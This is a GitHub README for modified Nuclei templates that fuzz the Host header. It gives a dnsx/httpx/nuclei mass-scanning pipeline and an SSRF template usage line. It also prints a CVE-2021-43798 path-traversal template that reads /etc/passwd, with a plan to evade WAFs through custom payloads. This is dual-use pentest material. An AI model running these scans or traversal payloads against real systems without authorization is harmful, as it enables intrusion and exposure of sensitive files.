<h4 align="center"> Modified Nuclei Templates Version to FUZZ Host Header</h4>


<p align="center">
<a href="https://twitter.com/0xAwali"><img src="https://img.shields.io/twitter/follow/0xAwali?style=social"></a>
</p>

<h1 align="center">Requirements</h1>
<h4 align="center">1 - Understand Virtual Host </h4>
<h4 align="center">Virtual Host refers to run more than one web site on a single IP</h4>
<h5 align="center">e.g. You can configure Nginx to run two web site e.g. dev.example.com and api.example.com like that</h5>

```sh
server {
        listen 80;
        listen [::]:80;

        root /var/www/dev/html;
        index index.html;

        server_name dev.example.com;

        location / {
                try_files $uri $uri/ =404;
        }
}
```

```sh
server {
        listen 443 ssl;
        listen [::]:443 ssl;
        
        ssl on;
        ssl_certificate /path/your.crt;
        ssl_trusted_certificate /path/your.crt;
        ssl_certificate_key /path/your.key;
        
        root /var/www/api/html;
        index index.html;

        server_name api.example.com;

        location / {
                try_files $uri $uri/ =404;
        }
}
```

<h4 align="center">2 - Install</h4>
<p align="center">
  <a href="https://github.com/projectdiscovery/dnsx">dnsx</a>
</p>
<p align="center">
  <a href="https://github.com/projectdiscovery/httpx">httpx</a>
</p>
<p align="center">
  <a href="https://github.com/projectdiscovery/nuclei">Nuclei</a>
</p>
<p align="center">
<a href="https://twitter.com/pdnuclei"><img src="https://img.shields.io/twitter/follow/pdnuclei?style=social"></a>
</p>
<p align="center">
  <a href="https://github.com/tomnomnom/anew">anew</a>
</p>
<p align="center">
<a href="https://twitter.com/TomNomNom"><img src="https://img.shields.io/twitter/follow/TomNomNom?style=social"></a>
</p>

<h4 align="center">3 - Clone this Repository</h4>
<p align="center">
  <a href="https://github.com/0xAwali/Virtual-Host">Virtual Host</a>
</p>

<h1 align="center">Usage</h1>

```sh
cat subdomains.txt | dnsx -a -silent -retry 5 -resp -o scanning.txt
```

```sh
cat scanning.txt | tr -d '[]' | awk '{ print $2 }' | sort -u | tee -a ips.txt
```

```sh
cat ips.txt | httpx -threads 200 -silent -retries 2 -timeout 10 -o aliveIPS.txt
```

```sh
cat scanning.txt | awk '{ print $1 }' | sort -u | tee -a resolvableDomains.txt
```

```sh
cat resolvableDomains.txt | httpx -threads 200 -silent -retries 2 -timeout 10 -o websites.txt
```
```sh
cat websites.txt | sed 's|^https://||' | sed 's|^http://||' | tee aliveSUBDOMAINS.txt
```

```sh
cat resolvableDomains.txt | anew aliveSUBDOMAINS.txt -d | tee -a deadSUBDOMAINS.txt
```

```sh
sed -i -- 's|/home/mahmoud/Wordlist/AllSubdomains.txt|/path/deadSUBDOMAINS.txt|' *.yaml
```

```sh
nuclei -c 300 -list aliveIPS.txt -bulk-size 50 -stats -retries 2 -timeout 20 -t "/Templates/CVE/" -severity high -o bugs.txt
```

<h1 align="center">Keep in Your Mind</h1>


<h4 align="center">If You gonna Use SSRF Templates , You must Use Your DOMAIN e.g. </h4>

```sh
nuclei -c 300 -list aliveIPS.txt -bulk-size 50 -stats -retries 2 -timeout 20 -t "/Templates/SSRF/*.yaml" -var "MY-DOMAIN=me.com"
```

<h4 align="center">To Minimize Number of ERRORS , Prefer Using FOR LOOP e.g. </h4>

```sh

for ip in `cat aliveIPS.txt`
do
 nuclei -u $ip -bulk-size 50 -stats -retries 2 -timeout 20 -t "/Templates/" -severity high -o bugs.txt
done

```


<h1 align="center">Tips</h1>
<h4 align="center">if U are Nuclei's Templates Contributer , write Your Templates by using HTTP raw format to MAKE THIS REPOSITORY UPDATE e.g.</h4>

```sh
id:

info:
  name:
  author:
  severity:

requests:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
        Accept-Encoding: gzip, deflate
        Accept: */*
        
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 

      - type: word
        words:
          - ""
          - ""
        condition: and

      - type: word
        part: header
        words:
          - ""
```

<h1 align="center">Planning </h1>
<h4 align="center">I'm Trying to modify Nuclei's Templates to become MORE Powerful e.g. CVE-2021-43798</h4>



```sh

id: CVE-2021-43798

info:
  name:
  author:
  severity:


requests:
  - method: GET
    path:
      - "{{BaseURL}}/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd"

    matchers-condition: and
    matchers:

      - type: regex
        regex:
          - "root:.*:0:0"

      - type: status
        status:
          - 200
```

<h4 align="center">I'm gonna Replace ../../../../../../../../../../../../../../../../../../../etc/passwd to {{FILE-unix}}</h4>


```sh

id: CVE-2021-43798

info:
  name: 
  author: 
  severity:


requests:
  - method: GET
    path:
      - "{{BaseURL}}/public/plugins/alertlist/{{FILE-unix}}"

    matchers-condition: and
    matchers:

      - type: regex
        regex:
          - "root:.*:0:0"

      - type: status
        status:
          - 200
```
<h4 align="center">that will help to bypass WAFs by using Custom paylaods because I think all WAFs detect ../../etc/passwd so using ../../etc/passwd is gonna be useless but using Custom paylaods is gonna be useful</h4>


<h1 align="center">Help ME !</h1>
<h4 align="center">these days I'm trying to find junior web penetration testing position but it's must be Remotely Becuase I'm still Student so IF YOU CAN HELP ME , DM on TWITTER</h4>
<p align="center">
<a href="https://twitter.com/0xAwali"><img src="https://img.shields.io/twitter/follow/0xAwali?style=social"></a>
</p>
